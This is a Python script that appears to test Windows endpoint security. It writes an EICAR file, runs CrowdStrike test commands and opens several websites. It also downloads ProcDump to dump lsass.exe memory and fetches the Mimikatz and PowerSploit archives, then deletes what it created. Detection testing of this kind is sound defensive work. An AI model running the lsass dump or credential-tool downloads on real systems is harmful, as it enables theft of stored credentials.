import subprocess as sp
from time import sleep
import os
from zipfile import ZipFile
import shutil
import sys
import ctypes
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import webbrowser


colorama_init() # Initialize Colors


def is_admin(): # Necessary Check to see if user running is NT/AUTHORITY || Administrator
    '''Returns True if script is running with administrator privileges'''

    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    '''Relaunch the script with admin privileges and keep the output visible'''

    script = os.path.abspath(sys.argv[0])  # Get absolute path of the script
    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])  # Properly format arguments
    python_exe = sys.executable  # Gets the correct Python interpreter

    # Relaunch using cmd.exe so the window stays open
    cmd = f'start cmd /k "{python_exe} \"{script}\" {params}"'
    
    # Use ShellExecute to elevate privileges
    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {cmd}", None, 1)
    
    sys.exit()


if not is_admin(): 
    print(f"{Fore.RED}[!]{Style.RESET_ALL} Relaunching as {Fore.RED}Admin{Style.RESET_ALL}...\n")
    run_as_admin()

print(f"{Fore.LIGHTGREEN_EX}[*]{Style.RESET_ALL} Running with {Fore.RED}Administrator{Style.RESET_ALL} privileges...\n")


class EPScenario:
    def __init__(self, ps, path):
        self.PS = ps
        self.path = path
        self.powersploit = r"https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip"
        self.mimikatz = r"https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip"
    

    def make_Eicar(self):
        '''Generate EICAR file on user Desktop'''

        eicar_file = os.path.join(f"{self.path}", "EICAR.txt")
        try:

            os.chdir(f"{self.path}") # Possibly reduant line of code 

            with open(eicar_file, "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            files = [os.path.join(self.path, f) for f in os.listdir(self.path) if "eicar" in f.lower()]

            if files:
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} File created: EICAR.txt!\n")

            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Looking for generated EICAR file.\n")
            cleanDesktop = [os.path.join(self.path, f) for f in os.listdir(self.path) if "eicar" in f.lower()]
            
            if not cleanDesktop:
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} No files to delete!\n")
            else:
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Waiting 5 seconds for EICAR detection...\n")
                sleep(5)
                print(f"{Fore.RED}[-] EICAR FILE FOUND!\n\tDELETING.\n{Style.RESET_ALL}")
                for file in cleanDesktop:
                    if os.path.isfile(file):
                        os.remove(file)
                        sleep(2)
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Desktop cleaned.\n")

        except FileNotFoundError as e:
            print("{Fore.RED}[-]{Style.RESET_ALL} Path not found.\n")
            path = input(f"{Fore.RED}[*]{Style.RESET_ALL} Enter path manually:\n")
            os.chdir(path=path)

            with open(eicar_file, "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")


    def cs_alerts(self):
        '''Checks Crowdstrike alerts via CS command list.'''

        commands = ["crowdstrike_test_low", "crowdstrike_test_medium", "crowdstrike_test_high", "crowdstrike_test_critical"]

        for cmd in commands:
            try:
                print(f"\n{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Running: {cmd}\n ")
                result = sp.run(cmd, shell=True, capture_output=True, text=True)

                if result.stdout:
                    print(result.stdout)

            except FileNotFoundError as e:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Command not found.\n{cmd}\n")

    def _dump_setup(self):
        '''Make relevant directories for easier cleanup'''

        os.makedirs(self.path + "ProcDump", exist_ok=True)
        os.makedirs(self.path + "Dump", exist_ok=True)
        path_ = os.path.join(f"{self.path}", "ProcDump")
        return path_

    
    def _cleaned_proc(self):
        '''Checks if files were deleted after calling dump_lsass method. - ProcDump'''

        # Collect matching filenames
        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if "dump" in f.lower()]
    
        
        if not files_to_delete:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No files to delete!\n")
            return False
        
        # Flags for proof of deletion

        sf_file = False 
        sf_dir = False

        # Delete files and directories separately
        while not sf_dir and not sf_file:
            for file in files_to_delete:
                try:
                    if os.path.isdir(file): # Check if object is a directory
                        shutil.rmtree(file, ignore_errors=True)  # Delete directory
                        sleep(1)
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted directory: {file}\n")
                        sf_dir = True

                    elif os.path.isfile(file): # Check if objet is file
                        os.remove(file)  # Delete file
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted file: {file}\n")
                        sf_file = True

                except PermissionError as e:
                    print(f"{Fore.RED}[!] Permission denied: {file} - {e}{Style.RESET_ALL}\n")
        else:
            return True
        

    def _cleaned_tools(self):
        '''Cleaup method to ensure all tools downloaded were removed succssfully. - mimikatz, Powersploit'''

        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if any(sub in f.lower() for sub in ["mimikatz", "powersploit", "master"])]
        # Put all relevant files into a list for easy iteration

        if not files_to_delete:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No files to delete!\n")
            return False
        
        # Flags for proof of deletion

        sf_file = False 
        sf_dir = False

        # Delete files and directories separately
        while not sf_dir and not sf_file:
            for file in files_to_delete:
                try:
                    if os.path.isdir(file): # Check if object is a directory
                        shutil.rmtree(file, ignore_errors=True)  # Delete directory
                        sleep(1)
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted directory: {file}\n")
                        sf_dir = True

                    elif os.path.isfile(file): # Check if object is file
                        os.remove(file)  # Delete file
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted file: {file}\n")
                        sf_file = True

                except PermissionError as e:
                    print(f"{Fore.RED}[!] Permission denied: {file} - {e}{Style.RESET_ALL}\n")
        else:
            return True
        
    
    def dump_lsass(self):
        '''Downloads ProcDump and executes basic dump for lsass.exe'''

        extraction_path = self._dump_setup()

        # Download Procdump
        sp.run([PS, "-Command", f"""Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {self.path}Procdump.zip"""] ,shell=True, text=True)
        zip_path = os.path.join(self.path, "Procdump.zip")

        # Unzip file
        with ZipFile(zip_path, "r") as procObject:
            procObject.extractall(path=extraction_path)

        # Run command
        try:    
            args = f'"{extraction_path}\\procdump64.exe" -accepteula -ma lsass.exe "{self.path}\\Dump\\lsass.dmp"'
            sp.run(["cmd.exe", "/c", args], shell=True, text=True)

        # Handle error
        except PermissionError as e: # Ignore error output
            sleep(1)
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Initialized ProcDump in Dump directory!\n")
            sleep(1)
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Lsass.dmp created at: {self.path}\\Dump\n\n{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Starting cleanup.....\n")
            sleep(1)

            cleaned_success = self._cleaned_proc()

            if cleaned_success:
                    sleep(1)
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Cleaning done!\n")
            else:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Cleaning files failed!\n")


    def _tools_setup(self):
        paths_ = list()
        os.makedirs(self.path + "mimikatz", exist_ok=True)
        os.makedirs(self.path + "Powersploit", exist_ok=True)
        paths_.append(os.path.join(f"{self.path}", "mimikatz"))
        paths_.append(os.path.join(f"{self.path}", "Powersploit"))
        return paths_


    def download_tools(self):
        '''Downloads mimikatz & Powersploit'''
        
        mimikatz_zip = "Mimikatz.zip"
        powersploit_zip = "Powersploit.zip"

        paths = self._tools_setup()

        try:
            sp.run([PS, "-Command", f"""Invoke-WebRequest {self.mimikatz} -OutFile {self.path}{mimikatz_zip}"""] ,shell=True, text=True)
            sp.run([PS, "-Command",f"""Invoke-WebRequest {self.powersploit} -OutFile {self.path}{powersploit_zip}"""] ,shell=True, text=True)

        except PermissionError as e: # Ignore error output
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Downloading tools....\n")
            sleep(3)
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Tools downloaded successfully!\n")

        
        mimikatz_zip_path = os.path.join(self.path, f"{mimikatz_zip}")
        powersploit_zip_path = os.path.join(self.path, f"{powersploit_zip}")

        # Unzip file
        try:
            with ZipFile(mimikatz_zip_path, "r") as mimiObject:
                mimiObject.extractall(path=paths[0])
        except OSError as e:
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Mimikatz was blocked by the security solution.\n")
    
        try:
            with ZipFile(powersploit_zip_path, "r") as powerSObject:
                powerSObject.extractall(path=paths[1])
                # Might need to run powerspoit in order for EDR to catch it

        except OSError as e:
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Powersploit was blocked by the security solution.\n")

        if self._cleaned_tools():
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Files were deleted successfully!\n")
        

    def surf_limits(self):
        '''Open various restricted websites to check security solutions'''

        chrome_path = r"C:/Program Files/Google/Chrome/Application/chrome.exe"
        webbrowser.register('chrome', None,  
                    webbrowser.BackgroundBrowser(chrome_path))
        # For now the URL's will be hardcoded
        urls = ["https://google.com","https://youtube.com","https://x.com","https://hackthebox.com","https://facebook.com"]
        
        for url in urls:
            webbrowser.get('chrome').open_new_tab(url) 


if __name__ == '__main__':

    PS = os.path.expandvars(r"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe")
    
    def get_desktop_path():
        '''Get absloute Desktop path'''

        # Check OneDrive first
        if "ONEDRIVE" in os.environ:
            desktop_path = os.path.join(os.environ["ONEDRIVE"], "Desktop")
        else:
            desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
        
        # Validate the path
        if os.path.exists(desktop_path):
            return desktop_path
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Detected desktop path does not exist: {desktop_path}\n")
            while True:
                user_input = input(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL}Enter the correct Desktop path manually: \n").strip()
                if os.path.exists(user_input):
                    return user_input
                else:
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} The entered path does not exist. Please try again.")
    
    desktop_path = get_desktop_path()

    EP_obj = EPScenario(ps=PS, path=desktop_path)

    EP_obj.make_Eicar()
    EP_obj.dump_lsass()
    EP_obj.surf_limits()
    EP_obj.download_tools()